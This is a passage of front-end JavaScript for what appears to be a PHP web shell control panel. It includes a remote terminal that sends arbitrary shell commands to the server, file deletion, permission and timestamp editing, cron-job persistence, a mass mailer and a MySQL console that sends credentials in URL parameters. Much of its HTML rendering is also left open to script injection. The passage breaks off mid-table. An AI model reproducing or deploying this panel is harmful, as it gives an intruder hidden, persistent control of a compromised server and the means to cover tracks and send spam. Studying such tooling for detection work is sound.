function toast(type,msg){
  const c=document.getElementById('toast');
  const el=document.createElement('div');
  el.className='ti '+type;
  el.innerHTML=`<span class="tic ${type}"><i class="fas ${type==='ok'?'fa-check-circle':'fa-circle-xmark'}"></i></span><span class="tim">${msg}</span>`;
  c.appendChild(el);
  setTimeout(()=>{el.style.transition='opacity .4s';el.style.opacity='0';},3200);
  setTimeout(()=>el.remove(),3700);
}

// GO UP
function goUp(){
  const parts = CURPATH.split('/').filter(Boolean);
  if(parts.length === 0){ navTo('/'); return; }
  parts.pop();
  navTo('/' + (parts.join('/') || ''));
}

// ══ MODAL SYSTEM ══════════════════════════════════════
const modalContent = {};

function openModal(id){
  // Build content lazily
  if(!modalContent[id]) buildModalContent(id);
  document.getElementById(id).classList.add('open');
  document.body.style.overflow='hidden';
}

function closeModal(id){
  document.getElementById(id).classList.remove('open');
  document.body.style.overflow='';
}

// Close on overlay click
document.addEventListener('click', e=>{
  if(e.target.classList.contains('modal-overlay')) closeModal(e.target.id);
});
// Close on ESC
document.addEventListener('keydown', e=>{
  if(e.key==='Escape') document.querySelectorAll('.modal-overlay.open').forEach(m=>closeModal(m.id));
});

function buildModalContent(id){
  modalContent[id] = true;
  const body = document.getElementById(id.replace('mo-','mb-'));
  if(!body) return;

  if(id==='mo-hash') body.innerHTML = `
    <div style="display:flex;gap:8px;margin-bottom:16px">
      <input id="hash-input" type="text" value="${CURPATH}" placeholder="/path/to/file"
        style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;flex:1;transition:border .18s">
      <button class="btn btn-primary" onclick="doHash()"><i class="fas fa-magnifying-glass"></i> Check</button>
    </div>
    <div id="hash-result" style="display:none;flex-direction:column;gap:7px">
      <div style="font-size:11px;color:var(--txt2);font-family:var(--mono);margin-bottom:4px" id="hash-meta"></div>
      ${['MD5','SHA1','SHA256','SHA512'].map(t=>`
      <div style="display:flex;align-items:center;gap:10px;padding:8px 12px;background:var(--bg2);border:1px solid var(--line);border-radius:7px">
        <span style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;width:56px;flex-shrink:0">${t}</span>
        <span id="h-${t.toLowerCase()}" style="font-family:var(--mono);font-size:11px;color:var(--a5);flex:1;word-break:break-all;cursor:pointer" onclick="copyText(this)" title="Click to copy"></span>
        <button onclick="copyText(document.getElementById('h-${t.toLowerCase()}'))" style="background:none;border:none;color:var(--txt3);cursor:pointer;font-size:11px;padding:2px 5px"><i class="fas fa-copy"></i></button>
      </div>`).join('')}
      <div style="display:flex;align-items:center;gap:10px;padding:8px 12px;background:var(--bg2);border:1px solid var(--line);border-radius:7px">
        <span style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;width:56px;flex-shrink:0">MIME</span>
        <span id="h-mime" style="font-family:var(--mono);font-size:11px;color:var(--a2);flex:1"></span>
      </div>
    </div>
    <div id="hash-err" style="display:none;color:var(--a3);font-size:12px;font-family:var(--mono);margin-top:8px"></div>`;

  if(id==='mo-ipinfo') body.innerHTML = `
    <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
      <input id="ip-input" type="text" placeholder="IP address or domain (empty = server IP)"
        style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;flex:1;min-width:180px;transition:border .18s">
      <button class="btn btn-primary" onclick="doIpInfo()"><i class="fas fa-magnifying-glass"></i> Lookup</button>
      <button class="btn" onclick="document.getElementById('ip-input').value='';doIpInfo()"><i class="fas fa-server"></i> Server IP</button>
    </div>
    <div id="ip-result" style="display:none">
      <table style="width:100%;border-collapse:collapse;font-size:12px">
        ${[['ip-r-ip','IP Address'],['ip-r-country','Country'],['ip-r-region','Region'],['ip-r-city','City'],['ip-r-zip','ZIP'],['ip-r-coords','Coordinates'],['ip-r-tz','Timezone'],['ip-r-isp','ISP'],['ip-r-org','Organization'],['ip-r-as','AS']].map(([id,lbl])=>`
        <tr style="border-bottom:1px solid var(--line)">
          <td style="padding:8px 12px;color:var(--txt3);font-family:var(--mono);font-size:10px;text-transform:uppercase;letter-spacing:1px;width:130px;white-space:nowrap">${lbl}</td>
          <td style="padding:8px 12px;color:var(--txt);font-family:var(--mono);font-size:12px" id="${id}">—</td>
        </tr>`).join('')}
      </table>
    </div>
    <div id="ip-err" style="display:none;color:var(--a3);font-size:12px;font-family:var(--mono);margin-top:8px"></div>`;

  if(id==='mo-mailer'){
    // Move mailer form content into modal
    const src = document.getElementById('mailer-panel');
    if(src) body.innerHTML = src.innerHTML;
  }

  if(id==='mo-zip'){
    const src = document.getElementById('zip-panel');
    if(src) body.innerHTML = src.innerHTML;
  }

  if(id==='mo-cron'){
    const src = document.getElementById('cron-panel');
    if(src){
      body.innerHTML = src.innerHTML;
      loadCrons();
    }
  }

  if(id==='mo-sinfo'){
    const src = document.getElementById('sinfo-panel');
    if(src) body.innerHTML = src.innerHTML;
  }

  if(id==='mo-scan'){
    body.innerHTML = `
    <style>
      .scan-sev-critical{color:#ff4444;font-weight:700}
      .scan-sev-high{color:#ff8c00;font-weight:600}
      .scan-sev-medium{color:var(--a4);font-weight:500}
      .scan-hit{background:var(--bg2);border:1px solid var(--line);border-radius:7px;padding:10px 14px;margin-bottom:8px}
      .scan-hit-name{font-size:11px;font-family:var(--mono);font-weight:600;margin-bottom:4px;display:flex;align-items:center;gap:8px}
      .scan-hit-preview{font-size:10px;font-family:var(--mono);color:var(--txt3);word-break:break-all;margin-top:4px;padding:5px 8px;background:var(--card2);border-radius:4px;line-height:1.5}
      .scan-file{background:var(--card2);border:1px solid var(--line2);border-radius:9px;margin-bottom:12px;overflow:hidden}
      .scan-file-hdr{padding:10px 14px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);cursor:pointer}
      .scan-file-path{font-family:var(--mono);font-size:11px;color:var(--txt2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
      .scan-file-body{padding:12px 14px}
      .scan-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:16px 20px;min-width:100px}
      .scan-stat .sv{font-size:28px;font-weight:700;font-family:var(--mono);line-height:1}
      .scan-stat .sl{font-size:10px;color:var(--txt3);font-family:var(--mono);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
      .scan-progress{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin:12px 0}
      .scan-progress-bar{height:100%;background:linear-gradient(90deg,var(--a1),var(--a3));border-radius:2px;width:0;transition:width .3s}
    </style>
    <div style="display:flex;gap:8px;margin-bottom:16px">
      <input id="scan-path" type="text" value="${CURPATH}"
        style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;flex:1;transition:border .18s">
      <button class="btn btn-primary" onclick="startScan()" id="scan-btn">
        <i class="fas fa-shield-virus"></i> Scan
      </button>
    </div>
    <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);margin-bottom:14px">
      Scans: PHP, JS, HTML files for eval obfuscation, webshells, backdoors, miners, remote includes, and 35+ malware signatures
    </div>
    <div id="scan-progress" style="display:none">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
        <div class="sr-spin" style="flex-shrink:0"></div>
        <span style="font-size:12px;font-family:var(--mono);color:var(--txt2)" id="scan-status">Scanning…</span>
      </div>
      <div class="scan-progress"><div class="scan-progress-bar" id="scan-bar"></div></div>
    </div>
    <div id="scan-results" style="display:none">
      <!-- stats row -->
      <div style="display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap">
        <div class="scan-stat"><span class="sv" id="ss-scanned" style="color:var(--a2)">0</span><span class="sl">Scanned</span></div>
        <div class="scan-stat"><span class="sv" id="ss-infected" style="color:var(--a3)">0</span><span class="sl">Infected</span></div>
        <div class="scan-stat"><span class="sv" id="ss-critical" style="color:#ff4444">0</span><span class="sl">Critical</span></div>
        <div class="scan-stat"><span class="sv" id="ss-high" style="color:#ff8c00">0</span><span class="sl">High</span></div>
        <div class="scan-stat"><span class="sv" id="ss-medium" style="color:var(--a4)">0</span><span class="sl">Medium</span></div>
      </div>
      <!-- clean banner -->
      <div id="scan-clean" style="display:none;text-align:center;padding:28px;background:rgba(87,229,158,.07);border:1px solid rgba(87,229,158,.2);border-radius:10px;color:var(--a5)">
        <i class="fas fa-shield-check" style="font-size:32px;display:block;margin-bottom:10px"></i>
        <div style="font-size:14px;font-weight:600">No threats detected</div>
        <div style="font-size:12px;color:var(--txt3);margin-top:4px" id="scan-clean-msg"></div>
      </div>
      <!-- infected files -->
      <div id="scan-infected-list"></div>
    </div>
    `;
  }

  if(id==='mo-mysql'){
    const src = document.getElementById('mysql-panel');
    if(src) body.innerHTML = src.innerHTML;
  }
  // scan modal built inline above
}

// TOOLBAR FORMS
function tog(id){
  const el=document.getElementById(id);
  el.classList.toggle('on');
  if(el.classList.contains('on')){const i=el.querySelector('input');if(i)i.focus();}
}

// TERMINAL
// Terminal handled via modal system
function tp(h){const b=document.getElementById('tbox');b.innerHTML+=h+'<br>';b.scrollTop=b.scrollHeight;}
const tHist=[]; let tIdx=-1;
let termCwd = CURPATH;
function updatePrompt(){
  const p = document.querySelector('.tprompt');
  if(p) p.textContent = termCwd.split('/').pop()+'❯';
  const lbl = document.getElementById('term-modal-cwd');
  if(lbl) lbl.textContent = termCwd;
}
document.getElementById('tinput').addEventListener('keydown',e=>{
  if(e.key==='ArrowUp'){if(tIdx<tHist.length-1){tIdx++;e.target.value=tHist[tHist.length-1-tIdx];}return;}
  if(e.key==='ArrowDown'){if(tIdx>0){tIdx--;e.target.value=tHist[tHist.length-1-tIdx];}else{tIdx=-1;e.target.value='';}return;}
  if(e.key!=='Enter')return;
  const cmd=e.target.value.trim();if(!cmd)return;
  tHist.push(cmd);tIdx=-1;e.target.value='';
  tp(`<span style="color:var(--a1)">❯ ${cmd}</span>`);
  fetch('?bash_cmd='+encodeURIComponent(cmd)+'&cwd='+encodeURIComponent(termCwd))
    .then(r=>r.text()).then(out=>{
      if(out==='__CLEAR__'){document.getElementById('tbox').innerHTML='';return;}
      if(out.startsWith('__CWD__')){
        termCwd = out.slice(7);
        updatePrompt();
        return;
      }
      tp(`<span style="color:#b0bec5">${out}</span>`);
    });
});

// FILTER CHIPS
let curF='all';
function setF(btn,type){
  document.querySelectorAll('.chip').forEach(c=>c.classList.remove('on'));
  btn.classList.add('on');curF=type;applyF();
}
function liveF(q){applyF(q);}
function applyF(q=''){
  const lq=q.toLowerCase();
  const rows=document.querySelectorAll('#ftable tbody tr[data-type]');
  let vis=0;
  rows.forEach(r=>{
    const ok=(curF==='all'||curF===r.dataset.type)&&(lq===''||r.dataset.name.includes(lq));
    r.classList.toggle('hr',!ok);if(ok)vis++;
  });
  const fc=document.getElementById('fcount');
  if(curF!=='all'||q!==''){fc.style.display='flex';fc.textContent=`${vis} item${vis!==1?'s':''}`;}
  else fc.style.display='none';
}

// BULK SELECT
function toggleAll(cb){
  document.querySelectorAll('.row-chk').forEach(c=>{
    const r=c.closest('tr');
    if(!r.classList.contains('hr')&&!r.classList.contains('back-row'))c.checked=cb.checked;
  });
  updateBulk();
}
function updateBulk(){
  const n=document.querySelectorAll('.row-chk:checked').length;
  document.getElementById('bulk-cnt').textContent=`${n} selected`;
  document.getElementById('bulk-bar').classList.toggle('on',n>0);
}
function bulkDeselect(){
  document.querySelectorAll('.row-chk').forEach(c=>c.checked=false);
  document.getElementById('chk-all').checked=false;
  updateBulk();
}
function bulkDelete(){
  const rows=document.querySelectorAll('.row-chk:checked');
  if(!rows.length)return;
  if(!confirm(`Delete ${rows.length} item(s)?`))return;
  const paths=[...rows].map(c=>c.closest('tr').dataset.path);
  Promise.all(paths.map(p=>fetch(`?delete=${encodeURIComponent(p)}&path=${encodeURIComponent(CURPATH)}`)))
    .then(()=>location.reload());
}

// TIMESTAMP
document.querySelectorAll('[data-tp]').forEach(el=>{
  el.onclick=()=>{
    const fp=el.dataset.tp,cur=(el.dataset.tc||'').replace(' ','T');
    el.innerHTML=`<input type="datetime-local" value="${cur}" style="background:var(--bg2);border:1px solid var(--a1);border-radius:4px;padding:2px 6px;color:var(--txt);font-family:var(--mono);font-size:11px;outline:none;">`;
    const i=el.querySelector('input');i.focus();
    i.onblur=()=>fetch(`?update_time=1&fp=${encodeURIComponent(fp)}&nt=${encodeURIComponent(i.value)}`).then(()=>location.reload());
  };
});

// CHMOD CHECKBOXES
document.querySelectorAll('.cbit').forEach(cb=>{
  cb.addEventListener('change',()=>{
    let v=0;
    document.querySelectorAll('.cbit:checked').forEach(c=>v|=parseInt(c.dataset.val));
    const oct='0'+v.toString(8).padStart(3,'0');
    document.getElementById('chmod_val').value=oct;
    document.getElementById('chmod-preview').textContent=oct;
  });
});

// PERMISSION click-to-edit
document.querySelectorAll('[data-pp]').forEach(el=>{
  el.onclick=()=>{
    const fp=el.dataset.pp,cur=el.dataset.pc;
    el.innerHTML=`<input type="text" value="${cur}" maxlength="4" style="background:var(--bg2);border:1px solid var(--a2);border-radius:4px;padding:2px 6px;color:var(--a2);font-family:var(--mono);font-size:11px;width:54px;outline:none;">`;
    const i=el.querySelector('input');i.focus();
    i.onblur=()=>fetch(`?change_permission=1&file_path=${encodeURIComponent(fp)}&new_permission=${encodeURIComponent(i.value)}`).then(()=>location.reload());
  };
});

// CRON JOB MANAGER
const cronDescs = {
  '* * * * *':    'Every minute',
  '*/5 * * * *':  'Every 5 min',
  '*/15 * * * *': 'Every 15 min',
  '*/30 * * * *': 'Every 30 min',
  '0 * * * *':    'Every hour',
  '0 0 * * *':    'Every day',
  '0 0 * * 0':    'Every week',
};

function setCron(btn){
  document.querySelectorAll('.cron-chip').forEach(c=>c.classList.remove('on'));
  btn.classList.add('on');
  document.getElementById('cron-expr').value = btn.dataset.cron;
  document.getElementById('cron-desc').textContent = btn.textContent.trim();
  updateCronPreview();
}

function updateCronPreview(){
  const expr = (document.getElementById('cron-expr')?.value||'').trim();
  const cmd  = (document.getElementById('cron-cmd')?.value||'').trim();
  const desc = cronDescs[expr] || 'Custom';
  document.getElementById('cron-desc').textContent = desc;
  document.getElementById('cron-preview').textContent = cmd ? `${expr} ${cmd}` : `${expr} [command]`;
}

document.addEventListener('DOMContentLoaded',()=>{
  document.getElementById('cron-expr')?.addEventListener('input', updateCronPreview);
  document.getElementById('cron-cmd')?.addEventListener('input', updateCronPreview);
  loadCrons();
});

function loadCrons(){
  const list = document.getElementById('cron-list');
  if(!list) return;
  list.innerHTML = '<div style="color:var(--txt3);font-size:12px;font-family:var(--mono)">Loading…</div>';
  fetch('?do=cron_list')
    .then(r=>r.json())
    .then(data=>{
      if(!data.jobs || data.jobs.length===0){
        list.innerHTML='<div style="color:var(--txt3);font-size:12px;font-family:var(--mono);padding:8px 0">No cron jobs found.</div>';
        return;
      }
      list.innerHTML = data.jobs.map(j=>{
        const parts = j.line.split(/\s+/);
        const expr  = parts.slice(0,5).join(' ');
        const cmd   = parts.slice(5).join(' ');
        const desc  = cronDescs[expr] || expr;
        return `<div class="cjob-row">
          <span class="expr" title="${expr}">${desc}</span>
          <span class="cmd" title="${j.line}">${cmd}</span>
          <form method="POST" style="flex-shrink:0">
            <input type="hidden" name="cron_delete" value="1">
            <input type="hidden" name="cron_line" value="${j.line.replace(/"/g,'&quot;')}">
            <input type="hidden" name="path" value="${CURPATH}">
            <button type="submit" class="ab dl" title="Delete cron" onclick="return confirm('Delete this cron job?')"><i class="fas fa-trash"></i></button>
          </form>
        </div>`;
      }).join('');
    })
    .catch(()=>{
      list.innerHTML='<div style="color:var(--a3);font-size:12px;font-family:var(--mono)">Failed to load — exec() may be disabled on this server.</div>';
    });
}

function setCronTarget(p){
  document.getElementById('cron-cmd').value = 'php '+p;
  const panel = document.getElementById('cron-panel');
  if(!panel.classList.contains('on')) panel.classList.add('on');
  updateCronPreview();
  panel.scrollIntoView({behavior:'smooth'});
}

// ZIP / UNZIP
function zipTab(btn, section){
  document.querySelectorAll('.zip-tab').forEach(t=>t.classList.remove('on'));
  document.querySelectorAll('.zip-section').forEach(s=>s.classList.remove('on'));
  btn.classList.add('on');
  document.getElementById(section).classList.add('on');
}

function setZipTarget(p, ext){
  const panel = document.getElementById('zip-panel');
  if(!panel.classList.contains('on')) panel.classList.add('on');
  if(ext === 'zip'){
    // unzip mode
    zipTab(document.querySelectorAll('.zip-tab')[1], 'zt-unzip');
    document.getElementById('unzip-target').value = p;
  } else {
    // zip mode
    zipTab(document.querySelectorAll('.zip-tab')[0], 'zt-zip');
    document.getElementById('zip-target').value = p;
    document.getElementById('zip-name').value = p.split('/').pop() + '.zip';
    updateZipPreview();
  }
  panel.scrollIntoView({behavior:'smooth'});
}

function updateZipPreview(){
  const target = document.getElementById('zip-target')?.value || '';
  const name   = document.getElementById('zip-name')?.value || 'archive.zip';
  const dir    = target.includes('/') ? target.substring(0, target.lastIndexOf('/')) : CURPATH;
  document.getElementById('zip-preview').textContent = CURPATH + '/' + (name||'archive.zip');
}

document.addEventListener('DOMContentLoaded',()=>{
  document.getElementById('zip-target')?.addEventListener('input', updateZipPreview);
  document.getElementById('zip-name')?.addEventListener('input', updateZipPreview);
});

// HASH CHECKER
function doHash(){
  const f = document.getElementById('hash-input').value.trim();
  if(!f) return;
  document.getElementById('hash-result').style.display='none';
  document.getElementById('hash-err').style.display='none';
  fetch('?do=hash&f='+encodeURIComponent(f))
    .then(r=>r.json()).then(d=>{
      if(!d.ok){ document.getElementById('hash-err').style.display='block'; document.getElementById('hash-err').textContent=d.msg; return; }
      document.getElementById('hash-meta').textContent = d.name+' — '+formatBytes(d.size)+' — '+d.mime;
      document.getElementById('h-md5').textContent    = d.md5;
      document.getElementById('h-sha1').textContent   = d.sha1;
      document.getElementById('h-sha256').textContent = d.sha256;
      document.getElementById('h-sha512').textContent = d.sha512;
      document.getElementById('h-mime').textContent   = d.mime;
      document.getElementById('hash-result').style.display='flex';
    }).catch(()=>{ document.getElementById('hash-err').style.display='block'; document.getElementById('hash-err').textContent='Request failed'; });
}
function formatBytes(b){ if(b<1024)return b+' B'; if(b<1048576)return (b/1024).toFixed(1)+' KB'; return (b/1048576).toFixed(1)+' MB'; }
function copyText(el){
  navigator.clipboard.writeText(el.textContent).then(()=>{ const orig=el.style.color; el.style.color='var(--a5)'; setTimeout(()=>el.style.color=orig,800); });
}

// IP INFO
function doIpInfo(){
  const ip = document.getElementById('ip-input').value.trim();
  document.getElementById('ip-result').style.display='none';
  document.getElementById('ip-err').style.display='none';
  fetch('?do=ipinfo&ip='+encodeURIComponent(ip))
    .then(r=>r.json()).then(d=>{
      if(d.status==='fail'){ document.getElementById('ip-err').style.display='block'; document.getElementById('ip-err').textContent=d.message||'Lookup failed'; return; }
      document.getElementById('ip-r-ip').textContent      = d.query||'—';
      document.getElementById('ip-r-country').textContent = (d.country||'—')+' ('+( d.countryCode||'')+')';
      document.getElementById('ip-r-region').textContent  = d.regionName||'—';
      document.getElementById('ip-r-city').textContent    = d.city||'—';
      document.getElementById('ip-r-zip').textContent     = d.zip||'—';
      document.getElementById('ip-r-coords').textContent  = (d.lat||'—')+', '+(d.lon||'—');
      document.getElementById('ip-r-tz').textContent      = d.timezone||'—';
      document.getElementById('ip-r-isp').textContent     = d.isp||'—';
      document.getElementById('ip-r-org').textContent     = d.org||'—';
      document.getElementById('ip-r-as').textContent      = d.as||'—';
      document.getElementById('ip-result').style.display='block';
    }).catch(()=>{ document.getElementById('ip-err').style.display='block'; document.getElementById('ip-err').textContent='Request failed'; });
}

// MYSQL MANAGER
let dbCreds = {};
function dbConnect(){
  dbCreds = {
    host: document.getElementById('db-host').value,
    user: document.getElementById('db-user').value,
    pass: document.getElementById('db-pass').value,
    db:   document.getElementById('db-name').value,
  };
  const status = document.getElementById('db-status');
  status.style.display='block'; status.style.color='var(--txt3)'; status.textContent='Connecting…';
  dbFetch('dbs').then(d=>{
    if(!d.ok){ status.style.color='var(--a3)'; status.textContent='✗ '+d.msg; return; }
    status.style.color='var(--a5)'; status.textContent='✓ Connected — '+d.dbs.length+' databases';
    document.getElementById('db-workspace').style.display='block';
    // populate db list
    const list = document.getElementById('db-list');
    list.innerHTML = d.dbs.map(db=>`<div class="db-list-item" onclick="selectDb('${db}')"><span>${db}</span><i class="fas fa-chevron-right" style="font-size:10px;color:var(--txt3)"></i></div>`).join('');
  }).catch(e=>{ status.style.color='var(--a3)'; status.textContent='✗ '+e.message; });
}

function selectDb(db){
  dbCreds.db = db;
  document.getElementById('db-selected').textContent = db;
  document.getElementById('db-name').value = db;
  dbFetch('tables').then(d=>{
    if(!d.ok) return;
    const tables = document.getElementById('db-tables');
    tables.innerHTML = d.tables.map(t=>`<div class="db-list-item" onclick="setQueryTable('${t}')"><i class="fas fa-table" style="font-size:11px;color:#a5b4fc"></i> <span>${t}</span></div>`).join('');
    // populate browse select
    const sel = document.getElementById('db-browse-table');
    sel.innerHTML = '<option value="">— select table —</option>' + d.tables.map(t=>`<option value="${t}">${t}</option>`).join('');
  });
}

function setQueryTable(t){
  mysqlTab(document.querySelectorAll('.mysql-tab')[1],'mt-query');
  document.getElementById('db-sql').value = `SELECT * FROM \`${t}\` LIMIT 50;`;
}

function dbQuery(){
  const sql = document.getElementById('db-sql').value.trim();
  if(!sql) return;
  const res = document.getElementById('db-query-result');
  res.innerHTML = '<div style="color:var(--txt3);font-family:var(--mono);font-size:12px">Running…</div>';
  dbFetch('query', {sql}).then(d=>{
    if(!d.ok){ res.innerHTML=`<div style="color:var(--a3);font-family:var(--mono);font-size:12px">✗ ${d.msg}</div>`; return; }
    if(d.type==='exec'){ res.innerHTML=`<div style="color:var(--a5);font-family:var(--mono);font-size:12px">✓ Query OK — ${d.affected} row(s) affected</div>`; return; }
    res.innerHTML = renderDbTable(d.cols, d.rows) + `<div style="font-size:11px;color:var(--txt3);font-family:var(--mono);margin-top:8px">${d.count} row(s)</div>`;
  }).catch(e=>{ res.innerHTML=`<div style="color:var(--a3);font-size:12px">${e.message}</div>`; });
}

function dbBrowse(page=0){
  const t = document.getElementById('db-browse-table').value;
  if(!t) return;
  const res = document.getElementById('db-browse-result');
  res.innerHTML = '<div style="color:var(--txt3);font-family:var(--mono);font-size:12px">Loading…</div>';
  dbFetch('browse', {}, {table:t, page}).then(d=>{
    if(!d.ok){ res.innerHTML=`<div style="color:var(--a3);font-size:12px">${d.msg}</div>`; return; }
    let html = renderDbTable(d.cols, d.rows);
    html += `<div style="display:flex;align-items:center;gap:10px;margin-top:10px;font-size:11px;font-family:var(--mono);color:var(--txt3)">`;
    html += `<span>${d.total} total rows</span>`;
    if(d.page>0) html+=`<button class="btn" onclick="dbBrowse(${d.page-1})" style="padding:4px 10px;font-size:11px"><i class="fas fa-chevron-left"></i> Prev</button>`;
    if((d.page+1)*d.limit < d.total) html+=`<button class="btn" onclick="dbBrowse(${d.page+1})" style="padding:4px 10px;font-size:11px">Next <i class="fas fa-chevron-right"></i></button>`;
    html += '</div>';
    res.innerHTML = html;
  });
}

function renderDbTable(cols, rows){
  if(!rows.length) return '<div style="color:var(--txt3);font-family:var(--mono);font-size:12px">No rows.</div>';
  let h = '<div style="overflow-x:auto"><table class="db-tbl"><thead><tr>';
  cols.forEach(c=>h+=`<th>${escHtml(c)}</th>`);
  h+='</tr></thead><tbody>';
  rows.forEach(r=>{ h+='<tr>'; cols.forEach(c=>h+=`<td title="${escHtml(String(r[c]??''))}">${escHtml(String(r[c]??'NULL'))}</td>`); h+='</tr>'; });
  h+='</tbody></table></div>';
  return h;
}

function dbFetch(action, postData={}, getExtra={}){
  const params = new URLSearchParams({do:'mysql', action, host:dbCreds.host, user:dbCreds.user, pass:dbCreds.pass, db:dbCreds.db, ...getExtra});
  return fetch('?'+params, {
    method: Object.keys(postData).length ? 'POST' : 'GET',
    headers: Object.keys(postData).length ? {'Content-Type':'application/x-www-form-urlencoded'} : {},
    body: Object.keys(postData).length ? new URLSearchParams({db_host:dbCreds.host,db_user:dbCreds.user,db_pass:dbCreds.pass,db_name:dbCreds.db,...postData}).toString() : undefined,
  }).then(r=>r.json());
}

function mysqlTab(btn, section){
  document.querySelectorAll('.mysql-tab').forEach(t=>t.classList.remove('on'));
  document.querySelectorAll('.mysql-section').forEach(s=>s.classList.remove('on'));
  btn.classList.add('on');
  document.getElementById(section).classList.add('on');
}

function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

// MAILER TABS
function mailTab(btn, section){
  document.querySelectorAll('.mail-tab').forEach(t=>t.classList.remove('on'));
  document.querySelectorAll('.mail-section').forEach(s=>s.classList.remove('on'));
  btn.classList.add('on');
  document.getElementById(section).classList.add('on');
  document.getElementById('mail-method').value = section==='mt-smtp' ? 'smtp' : 'mail';
}

// ══ AJAX NAVIGATION (fast folder switching) ══════════
let navLoading = false;

function navTo(path, pushState=true){
  if(navLoading) return;
  navLoading = true;

  // Loading indicator
  const tbody = document.querySelector('#ftable tbody');
  tbody.style.opacity = '.4';
  tbody.style.transition = 'opacity .15s';

  fetch('?do=ls&path='+encodeURIComponent(path))
    .then(r=>r.json())
    .then(d=>{
      if(!d.ok){ location.href='?path='+encodeURIComponent(path); return; }

      // Update URL tanpa reload
      if(pushState) history.pushState({path}, '', '?path='+encodeURIComponent(d.path));

      // Update breadcrumb
      updateBc(d.segs, d.path);

      // Update stats
      document.querySelector('.stats span:nth-child(1)').innerHTML = '<i class="fas fa-folder"></i>'+d.folders.length+' folders';
      document.querySelector('.stats span:nth-child(2)').innerHTML = '<i class="fas fa-file"></i>'+d.files.length+' files';
      document.querySelector('.stats .pd').textContent = d.path;

      // Update CURPATH
      window.CURPATH = d.path;

      // Update hidden path inputs
      document.querySelectorAll('input[name=path]').forEach(i=>i.value=d.path);

      // Re-render table
      renderTable(d, tbody);

      tbody.style.opacity = '1';
      navLoading = false;

      // Scroll top
      window.scrollTo({top:0, behavior:'smooth'});
    })
    .catch(()=>{
      // fallback normal navigation
      location.href='?path='+encodeURIComponent(path);
      navLoading = false;
    });
}

function updateBc(segs, fullPath){
  const bc = document.querySelector('.bc');
  let html = '<span class="bc-pre">path</span>';
  html += '<a href="javascript:void(0)" class="bc-seg" onclick="navTo('/')">/</a>';
  let acc = '';
  segs.forEach((seg, idx)=>{
    acc += '/'+seg;
    const isLast = (idx === segs.length-1);
    html += '<span class="bc-sep"><i class="fas fa-chevron-right" style="font-size:8px"></i></span>';
    if(isLast) html += `<span class="bc-seg cur">${esc(seg)}</span>`;
    else {
      const p = acc;
      html += `<a href="javascript:void(0)" class="bc-seg" onclick="navTo('${p.replace(/'/g,"\'")}')">${esc(seg)}</a>`;
    }
  });
  bc.innerHTML = html;
}

function renderTable(d, tbody){
  const extColor = {
    php:'#7c6dfa',py:'#7c6dfa',js:'#7c6dfa',ts:'#7c6dfa',rb:'#7c6dfa',go:'#7c6dfa',
    c:'#7c6dfa',cpp:'#7c6dfa',cs:'#7c6dfa',java:'#7c6dfa',sh:'#7c6dfa',bash:'#7c6dfa',
    html:'#4fc8ff',htm:'#4fc8ff',css:'#4fc8ff',scss:'#4fc8ff',vue:'#4fc8ff',jsx:'#4fc8ff',
    jpg:'#57e59e',jpeg:'#57e59e',png:'#57e59e',gif:'#57e59e',svg:'#57e59e',webp:'#57e59e',
    zip:'#ffc46d',tar:'#ffc46d',gz:'#ffc46d',rar:'#ffc46d','7z':'#ffc46d',
    txt:'#cdd6f4',md:'#cdd6f4',log:'#cdd6f4',csv:'#cdd6f4',json:'#cdd6f4',xml:'#cdd6f4',
    sql:'#fa6d8a',db:'#fa6d8a',sqlite:'#fa6d8a',
    pdf:'#fa6d8a',doc:'#4fc8ff',docx:'#4fc8ff',xls:'#57e59e',xlsx:'#57e59e',
  };
  const extIcon = {
    php:'fa-code',py:'fa-code',js:'fa-code',ts:'fa-code',rb:'fa-code',go:'fa-code',
    c:'fa-code',cpp:'fa-code',cs:'fa-code',java:'fa-code',sh:'fa-code',bash:'fa-code',
    html:'fa-code',htm:'fa-code',css:'fa-code',scss:'fa-code',vue:'fa-code',jsx:'fa-code',
    jpg:'fa-image',jpeg:'fa-image',png:'fa-image',gif:'fa-image',svg:'fa-image',webp:'fa-image',
    zip:'fa-file-zipper',tar:'fa-file-zipper',gz:'fa-file-zipper',rar:'fa-file-zipper',
    txt:'fa-file-lines',md:'fa-file-lines',log:'fa-file-lines',csv:'fa-file-lines',
    json:'fa-file-code',xml:'fa-file-code',yaml:'fa-file-code',yml:'fa-file-code',
    sql:'fa-database',db:'fa-database',sqlite:'fa-database',
    pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',
    xls:'fa-file-excel',xlsx:'fa-file-excel',
    mp3:'fa-file-audio',wav:'fa-file-audio',
    mp4:'fa-file-video',avi:'fa-file-video',mkv:'fa-file-video',
  };

  let html = `<tr class="back-row"><td colspan="7">
    <a class="blnk" href="javascript:void(0)" onclick="navTo('${esc(d.parent).replace(/'/g,"\'")}')">
      <i class="fas fa-arrow-up"></i> ../ up one level
    </a>
  </td></tr>`;

  // Folders
  d.folders.forEach(f=>{
    const fp = f.path.replace(/'/g,"\'");
    html += `<tr data-type="folder" data-name="${f.name.toLowerCase()}" data-path="${esc(f.path)}">
      <td class="chk"><input type="checkbox" class="row-chk" onchange="updateBulk()"></td>
      <td><div class="nm">
        <span class="ico"><i class="fas fa-folder" style="color:var(--a4)"></i></span>
        <a href="javascript:void(0)" onclick="navTo('${fp}')">${esc(f.name)}</a>
      </div></td>
      <td><span class="badge bd">dir</span></td>
